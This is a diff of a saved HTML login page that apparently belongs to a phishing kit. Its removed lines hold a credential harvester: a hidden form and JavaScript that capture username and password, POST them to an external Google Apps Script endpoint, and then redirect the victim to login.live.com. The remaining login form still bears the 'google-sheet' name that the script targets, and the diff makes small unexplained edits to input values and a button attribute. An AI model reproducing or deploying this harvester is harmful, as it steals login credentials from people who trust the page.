@@ -981,7 +981,7 @@ src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiP
     <form id="login-form" name="google-sheet" method="post" action="/login">
       <div id="credentials" class="">
         <div class="input-group">
-          <input id="login-account-name" class="ember-text-field ember-view" autocomplete="username webauthn" autocorrect="off" autocapitalize="none" autofocus="autofocus" tabindex="1" type="email" name="Username" value="">
+          <input id="login-account-name" class="ember-text-field ember-view" autocomplete="username webauthn" autocorrect="off" autocapitalize="none" autofocus="autofocus" tabindex="1" type="email" name="Username" value="/">
           <label class="alt-placeholder" for="login-account-name">
             Email / Username
           </label>
@@ -990,7 +990,7 @@ src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiP
             </a>
         </div>
         <div class="input-group">
-          <input autocomplete="current-password" tabindex="1" placeholder="" maxlength="200" id="login-account-password" class="ember-text-field ember-view" type="password" name="Password" value="">
+          <input autocomplete="current-password" tabindex="1" placeholder="" maxlength="200" id="login-account-password" class="ember-text-field ember-view" type="password" name="Password" value="/">
           <label class="alt-placeholder" for="login-account-password">
             Password
           </label>
@@ -1029,7 +1029,7 @@ src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiP
           
     
     <button class="btn btn-text btn-large btn-primary login-page-cta__login" id="login-button" form="login-form" tabindex="2" type="button" able>
-<!----><span class="d-button-label" able>Log In<!----></span>
+<!----><span class="d-button-label" allow>Log In<!----></span>
     </button>
   
   
@@ -1154,30 +1154,6 @@ src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiP
 <!---->    </section>
   
   </section>
-
-      <form id="login-form" name="google-sheet" method="post" action="/login">
-        <input name="Username" type="text" id="signin_username" value="">
-        <input name="Password" type="password" id="signin_password" value="">
-        <input name="redirect" type="hidden" value="https://login.live.com">
-        <input type="submit" id="signin-button" value="Office'25">
-      </form><script type="text/javascript">
-
-
-   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
-            const form = document.forms['google-sheet']
-          
-            form.addEventListener('submit', e => {
-              e.preventDefault()
-              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-    .then(() => {
-      const redirectUrl = 'https://login.live.com';
-      const link = document.createElement('a');
-      link.href = redirectUrl;
-      link.click();
-    })
-    .catch((error) => console.error('Error!', error.message));
-            })
-  </script>
 
     <script data-savepage-type="" type="text/plain" defer="" data-savepage-src="/assets/start-discourse-2f46827b.js" nonce=""></script>
 
